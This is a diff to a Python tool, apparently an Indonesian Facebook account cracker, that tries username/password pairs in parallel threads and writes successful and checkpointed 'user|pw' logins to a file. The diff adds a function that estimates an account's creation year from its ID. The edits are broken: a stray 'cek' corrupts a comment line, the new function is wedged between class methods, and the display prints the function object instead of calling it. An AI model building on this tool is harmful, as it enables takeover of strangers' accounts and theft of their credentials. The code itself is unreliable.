@@ -1,4 +1,4 @@
-###----------[ IMPORT MODULE LAIN ]---------- ###
+cek###----------[ IMPORT MODULE LAIN ]---------- ###
 import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
@@ -612,7 +612,38 @@ class Crack:
 						fall.submit(self.metode_api,user,pwx)
 		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
 		sys.exit()
-							
+
+def cektahun(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tahunz = '2009'
+		elif fx[:9] in ['100000000']       :tahunz = '2009'
+		elif fx[:8] in ['10000000']        :tahunz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+		elif fx[:6] in ['100001']          :tahunz = '2010'
+		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
+		elif fx[:6] in ['100004']          :tahunz = '2012'
+		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
+		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
+		elif fx[:6] in ['100009']          :tahunz = '2015'
+		elif fx[:5] in ['10001']           :tahunz = '2016'
+		elif fx[:5] in ['10002']           :tahunz = '2017'
+		elif fx[:5] in ['10003']           :tahunz = '2018'
+		elif fx[:5] in ['10004']           :tahunz = '2019'
+		elif fx[:5] in ['10005']           :tahunz = '2020'
+		elif fx[:5] in ['10006']           :tahunz = '2021'
+		elif fx[:5] in ['10009']           :tahunz = '2023'
+		elif fx[:5] in ['10007','10008']:tahunz = '2022'
+		else:tahunz=''
+	elif len(fx) in [9,10]:
+		tahunz = '2008'
+	elif len(fx)==8:
+		tahunz = '2007'
+	elif len(fx)==7:
+		tahunz = '2006'
+	else:tahunz=''
+	return tahunz	
+	
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
 		prog.update(des,description=f" {H2}• {P2}[{H2}NolepXx{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
@@ -670,7 +701,7 @@ class Crack:
 						tree.add(Panel(f"{K2}   Checkpoint-Login{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
 						tree.add(f"\r{P2}User ID {P2}     : {K2}{user}")
 						tree.add(f"{P2}Password {P2}    : {K2}{pw}")
-						tree.add(f"{P2}Cek-Tahun {P2}    : {K2}{tahun}")
+						tree.add(f"{P2}Cek-Tahun {P2}    : {K2}{cektahun}")
 						tree.add(Panel(f"{K2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_cp}"))
 						prints(tree)
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
